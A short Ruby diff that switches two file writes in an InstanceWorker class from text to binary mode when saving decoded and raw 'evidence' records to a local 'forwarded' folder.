@@ -74,7 +74,7 @@ class InstanceWorker
               RCS::Evidence.new(@key).deserialize(raw) do |data|
                 if forwarding?
                   path = "forwarded/#{evidence_id}.dec"
-                  f = File.open(path, 'w') {|f| f.write data}
+                  f = File.open(path, 'wb') {|f| f.write data}
                   trace :debug, "[#{evidence_id}] forwarded decoded evidence #{evidence_id} to #{path}"
                 end
               end
@@ -142,7 +142,7 @@ class InstanceWorker
 
             Dir.mkdir "forwarded" unless File.exists? "forwarded"
             path = "forwarded/#{evidence_id}.raw"
-            f = File.open(path, 'w') {|f| f.write raw}
+            f = File.open(path, 'wb') {|f| f.write raw}
             trace :debug, "[#{evidence_id}] forwarded undecoded evidence #{evidence_id} to #{path}"
           end
         end
